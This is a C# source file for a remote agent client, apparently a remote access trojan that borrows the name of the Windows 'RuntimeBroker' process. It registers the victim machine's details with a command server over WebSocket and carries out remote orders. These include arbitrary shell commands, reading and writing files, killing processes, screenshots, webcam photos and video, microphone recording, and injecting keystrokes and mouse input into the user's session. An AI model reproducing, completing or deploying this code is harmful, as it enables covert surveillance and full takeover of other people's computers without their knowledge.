using System.Net.WebSockets;
using System.Text;
using System.Text.Json;

namespace RuntimeBroker;

public class AgentClient
{
    private readonly AgentConfig _config;
    private DeviceInfo _device;
    private readonly CancellationTokenSource _cts = new();
    private readonly SemaphoreSlim _sendGate = new(1, 1);

    private ClientWebSocket? _ws;
    private int _reconnectDelaySec;

    public event Action<string>? Log;

    public bool IsConnected => _ws?.State == WebSocketState.Open;
    public string MachineName => _device.Hostname;
    public static string AgentVersion => AgentVersionInfo.Version;

    public AgentClient(AgentConfig config)
    {
        _config = config;
        _device = new DeviceInfo();
        _reconnectDelaySec = _config.ReconnectDelaySec;
    }

    public void Stop() => _cts.Cancel();

    public async Task RunAsync()
    {
        // Inventory (wmic/PowerShell) can take 10-25s — collect it here on the
        // worker task, NEVER on the service OnStart path (SCM start timeout).
        try
        {
            var collected = await Task.Run(DeviceInfo.Collect, _cts.Token);
            _device = collected;
            LogLine($"Device: {_device.Hostname} | {_device.Model} | {_device.Username}");
        }
        catch (OperationCanceledException)
        {
            return;
        }
        catch (Exception ex)
        {
            LogLine($"Device inventory failed ({ex.Message}) — continuing with defaults.");
        }

        while (!_cts.IsCancellationRequested)
        {
            try
            {
                var uri = new Uri($"{_config.ServerUrl.TrimEnd('/')}?token={Uri.EscapeDataString(_config.Token)}");

                _ws?.Dispose();
                _ws = new ClientWebSocket();
                _ws.Options.KeepAliveInterval = TimeSpan.FromSeconds(15);
                await _ws.ConnectAsync(uri, _cts.Token);
                _reconnectDelaySec = _config.ReconnectDelaySec;
                LogLine($"Connected to {uri.Host}:{uri.Port}");

                await SendAsync(new
                {
                    type = "register",
                    machineName = _device.Hostname,
                    hostname = _device.Hostname,
                    model = _device.Model,
                    serial = _device.Serial,
                    username = _device.Username,
                    user = _device.Username,
                    os = _device.Os,
                    ip = _device.Ip,
                    version = AgentVersion
                });

                var keepAliveSec = Math.Max(0, _config.KeepAliveSec);
                using var keepAliveCts = CancellationTokenSource.CreateLinkedTokenSource(_cts.Token);
                var keepAliveTask = keepAliveSec > 0 ? KeepAliveLoopAsync(keepAliveSec, keepAliveCts.Token) : Task.CompletedTask;

                try
                {
                    await ReceiveLoopAsync();
                }
                finally
                {
                    keepAliveCts.Cancel();
                    try { await keepAliveTask; } catch { }
                }
            }
            catch (OperationCanceledException)
            {
                return;
            }
            catch (Exception ex)
            {
                LogLine($"Connection error: {ex.Message}");
            }

            _reconnectDelaySec = Math.Min(30, Math.Max(1, _reconnectDelaySec) + 3);
            LogLine($"Reconnecting in {_reconnectDelaySec}s...");
            try { await Task.Delay(_reconnectDelaySec * 1000, _cts.Token); } catch { return; }
        }
    }

    private async Task KeepAliveLoopAsync(int intervalSec, CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            try { await Task.Delay(intervalSec * 1000, ct); } catch { return; }
            try
            {
                await SendAsync(new { type = "keepalive", at = DateTimeOffset.UtcNow.ToUnixTimeSeconds() });
            }
            catch
            {
                try { _ws?.Dispose(); } catch { }
                return;
            }
        }
    }

    private async Task ReceiveLoopAsync()
    {
        var buffer = new byte[16384];
        while (_ws?.State == WebSocketState.Open)
        {
            try
            {
                WebSocketReceiveResult result;
                using var ms = new MemoryStream();
                do
                {
                    result = await _ws.ReceiveAsync(new ArraySegment<byte>(buffer), _cts.Token);
                    ms.Write(buffer, 0, result.Count);
                } while (!result.EndOfMessage);

                if (result.MessageType == WebSocketMessageType.Close)
                {
                    try { await _ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "bye", CancellationToken.None); } catch { }
                    break;
                }

                var text = Encoding.UTF8.GetString(ms.ToArray());
                _ = Task.Run(() => HandleMessageAsync(text));
            }
            catch (OperationCanceledException)
            {
                return;
            }
            catch (Exception ex)
            {
                LogLine($"Receive error: {ex.Message}");
                return;
            }
        }
    }

    private async Task HandleMessageAsync(string json)
    {
        try
        {
            using var doc = JsonDocument.Parse(json);
            var root = doc.RootElement;
            var type = root.TryGetProperty("type", out var t) ? t.GetString() : "";
            switch (type)
            {
                case "hello":
                    LogLine("Channel ready.");
                    break;
                case "registered":
                    LogLine($"Registered on server as {_device.Hostname}");
                    break;
                case "cmd":
                    await HandleCmdAsync(root);
                    break;
            }
        }
        catch (Exception ex)
        {
            LogLine($"Message error: {ex.Message}");
        }
    }

    private async Task HandleCmdAsync(JsonElement el)
    {
        var taskId = RemoteCommands.GetString(el, "taskId");
        var cmd = RemoteCommands.GetString(el, "cmd");
        var p = el.TryGetProperty("params", out var pp) && pp.ValueKind == JsonValueKind.Object
            ? pp : new JsonElement?();
        JsonElement empty = JsonDocument.Parse("{}").RootElement;
        var prm = p ?? empty;

        try
        {
            switch (cmd)
            {
                case "capture_screenshot":
                    await HandleScreenshotAsync(taskId, prm);
                    return;
                case "shell_exec": {
                    var command = RemoteCommands.GetString(prm, "command");
                    var timeout = RemoteCommands.GetInt(prm, "timeoutSec", 30);
                    var (ok, output, code, err) = RemoteCommands.ShellExec(command, timeout);
                    await Result(taskId, ok, output, null, err ?? "", code);
                    return;
                }
                case "list_processes": {
                    var list = RemoteCommands.ListProcesses();
                    await Result(taskId, true, "", list, "", 0);
                    return;
                }
                case "kill_process": {
                    var pid = RemoteCommands.GetInt(prm, "pid", -1);
                    var (ok, err) = RemoteCommands.KillProcess(pid);
                    await Result(taskId, ok, ok ? $"Killed {pid}" : "", null, err ?? "", ok ? 0 : 1);
                    return;
                }
                case "list_services": {
                    var list = RemoteCommands.ListServices();
                    await Result(taskId, true, "", list, "", 0);
                    return;
                }
                case "service_action": {
                    var name = RemoteCommands.GetString(prm, "name");
                    var action = RemoteCommands.GetString(prm, "action");
                    var (ok, err) = RemoteCommands.ServiceAction(name, action);
                    await Result(taskId, ok, ok ? $"{action} {name}" : "", null, err ?? "", ok ? 0 : 1);
                    return;
                }
                case "list_files": {
                    var path = RemoteCommands.GetString(prm, "path");
                    var rec = RemoteCommands.GetBool(prm, "recursive", false);
                    try
                    {
                        var items = RemoteCommands.ListFiles(path, rec);
                        await Result(taskId, true, string.IsNullOrWhiteSpace(path) ? "C:\\" : path, items, "", 0);
                    }
                    catch (Exception ex)
                    {
                        await Result(taskId, false, "", null, ex.Message, 1);
                    }
                    return;
                }
                case "read_file": {
                    var path = RemoteCommands.GetString(prm, "path");
                    var (ok, b64, err) = RemoteCommands.ReadFile(path);
                    await Result(taskId, ok, b64 ?? "", null, err ?? "", ok ? 0 : 1);
                    return;
                }
                case "write_file": {
                    var path = RemoteCommands.GetString(prm, "path");
                    var b64 = RemoteCommands.GetString(prm, "base64");
                    var (ok, err) = RemoteCommands.WriteFile(path, b64);
                    await Result(taskId, ok, ok ? $"Wrote {path}" : "", null, err ?? "", ok ? 0 : 1);
                    return;
                }
                case "transfer_file": {
                    var b64 = RemoteCommands.GetString(prm, "base64");
                    var name = RemoteCommands.GetString(prm, "filename");
                    var (ok, saved, err) = RemoteCommands.TransferFile(b64, name);
                    await Result(taskId, ok, saved ?? "", null, err ?? "", ok ? 0 : 1);
                    return;
                }
                // Input runs in the user session (SendInput from the
                // Session-0 service never reaches the interactive desktop).
                case "input_text": {
                    var text = RemoteCommands.GetString(prm, "text");
                    var file = StageText(text);
                    var (ok, err) = PowerShellRunner.RunInteractiveInput($"--input-text \"{file}\"", 30);
                    if (!ok) { try { File.Delete(file); } catch { } }
                    await Result(taskId, ok, ok ? "ok" : err ?? "", null, ok ? "" : err ?? "", ok ? 0 : 1);
                    return;
                }
                case "input_mouse": {
                    var x = RemoteCommands.GetInt(prm, "x");
                    var y = RemoteCommands.GetInt(prm, "y");
                    var action = (RemoteCommands.GetString(prm, "action") ?? "").Trim();
                    if (string.IsNullOrEmpty(action)) action = "move";
                    var amount = RemoteCommands.GetInt(prm, "amount",
                        RemoteCommands.GetInt(prm, "delta",
                        RemoteCommands.GetInt(prm, "dy", 120)));
                    var (ok, err) = PowerShellRunner.RunInteractiveInput(
                        $"--input-mouse {x} {y} {action} {amount}", 30);
                    await Result(taskId, ok, ok ? "ok" : err ?? "", null, ok ? "" : err ?? "", ok ? 0 : 1);
                    return;
                }
                case "input_paragraph": {
                    var text = RemoteCommands.GetString(prm, "text");
                    var wpm = RemoteCommands.GetInt(prm, "wpm", 60);
                    var addEnter = RemoteCommands.GetBool(prm, "addEnter", false);
                    // Fire-and-forget in the user session: the phone watches
                    // progress on live screen. Stopped via stop_typing/stop_all.
                    var file = StageText(text);
                    var (ok, err) = PowerShellRunner.StartInteractiveParagraph(file, wpm, addEnter);
                    if (!ok) { try { File.Delete(file); } catch { } }
                    await Result(taskId, ok, ok ? "Started" : err ?? "", null, ok ? "" : err ?? "", ok ? 0 : 1);
                    return;
                }
                case "stop_typing":
                    InteractiveActions.CancelAll();
                    PowerShellRunner.EndInteractiveInput();
                    await Result(taskId, true, "Typing stopped", null, "", 0);
                    return;
                case "stop_all":
                    InteractiveActions.CancelAll();
                    PowerShellRunner.EndInteractiveInput();
                    RemoteCommands.StopAudio();
                    LogLine("Stop-all received.");
                    return;
                case "screen_rotate": {
                    var deg = RemoteCommands.GetInt(prm, "degrees", 0);
                    var (ok, err) = RemoteCommands.ScreenRotate(deg);
                    await Result(taskId, ok, ok ? $"Rotated {deg}" : "", null, err ?? "", ok ? 0 : 1);
                    return;
                }
                case "camera_photo": {
                    var (ok, b64, err) = RemoteCommands.CameraPhoto();
                    await Result(taskId, ok, b64 ?? "", null, err ?? "", ok ? 0 : 1);
                    return;
                }
                case "camera_video": {
                    var seconds = RemoteCommands.GetInt(prm, "seconds", 10);
                    var (ok, b64, err) = RemoteCommands.CameraVideo(seconds);
                    await Result(taskId, ok, b64 ?? "", null, err ?? "", ok ? 0 : 1);
                    return;
                }
                case "mic_record": {
                    var seconds = RemoteCommands.GetInt(prm, "seconds", 5);
                    var (ok, b64, err) = RemoteCommands.MicRecord(seconds);
                    await Result(taskId, ok, b64 ?? "", null, err ?? "", ok ? 0 : 1);
                    return;
                }
                case "play_audio": {
                    var b64 = RemoteCommands.GetString(prm, "base64");
                    var name = RemoteCommands.GetString(prm, "filename");
                    var (ok, err) = RemoteCommands.PlayAudio(b64, name);
                    await Result(taskId, ok, ok ? "Playing" : "", null, err ?? "", ok ? 0 : 1);
                    return;
                }
                case "stop_audio":
                    RemoteCommands.StopAudio();
                    await Result(taskId, true, "Audio stopped", null, "", 0);
                    return;
                default:
                    await Result(taskId, false, "", null, $"Unknown command: {cmd}", 1);
                    return;
            }
        }
        catch (Exception ex)
        {
            await Result(taskId, false, "", null, ex.Message, 1);
        }
    }

    private async Task HandleScreenshotAsync(string taskId, JsonElement prm)
    {
        try
        {
            var format = RemoteCommands.GetString(prm, "format");
            if (string.IsNullOrWhiteSpace(format)) format = "png";
            var quality = RemoteCommands.GetInt(prm, "quality", 80);
            var maxWidth = RemoteCommands.GetInt(prm, "maxWidth", 0);

            var png = ScreenCapture.CaptureBytes(format, quality, maxWidth);
            string error = "";
            if (png == null)
            {
                var outFile = Path.Combine(PowerShellRunner.CaptureWorkDir(), $"shot-{Guid.NewGuid().ToString("N")[..10]}.b64");
                var (b64, err) = PowerShellRunner.RunInInteractiveSession(outFile, 15, format, quality, maxWidth);
                error = err ?? "";
                if (b64 != null)
                {
                    try { png = Convert.FromBase64String(b64); } catch { png = null; error = "Invalid capture payload"; }
                }
            }

            if (png == null || png.Length == 0)
            {
                if (string.IsNullOrEmpty(error)) error = "Screenshot capture failed";
                await Result(taskId, false, "", null, error, 1);
                return;
            }
            await Result(taskId, true, Convert.ToBase64String(png), null, "", 0);
        }
        catch (Exception ex)
        {
            await Result(taskId, false, "", null, ex.Message, 1);
        }
    }

    private static string StageText(string text)
    {
        var dir = PowerShellRunner.CaptureWorkDir();
        var file = Path.Combine(dir, $"input-{Guid.NewGuid():N}.txt");
        File.WriteAllText(file, text ?? "");
        return file;
    }

    private async Task Result(string taskId, bool success, string output, object? data, string error, int exitCode)
    {
        try
        {
            await SendAsync(new { type = "result", taskId, success, output, data, error, exitCode });
        }
        catch (Exception ex)
        {
            LogLine($"Result send failed: {ex.Message}");
        }
    }

    private async Task SendAsync(object payload)
    {
        var socket = _ws;
        if (socket?.State != WebSocketState.Open)
            throw new WebSocketException("WebSocket is not open");
        var json = JsonSerializer.Serialize(payload);
        var bytes = Encoding.UTF8.GetBytes(json);
        var seg = new ArraySegment<byte>(bytes);
        await _sendGate.WaitAsync(_cts.Token);
        try
        {
            if (socket.State != WebSocketState.Open)
                throw new WebSocketException("WebSocket closed before send");
            await socket.SendAsync(seg, WebSocketMessageType.Text, true, _cts.Token);
        }
        finally
        {
            _sendGate.Release();
        }
    }

    private void LogLine(string s) => Log?.Invoke(s);
}
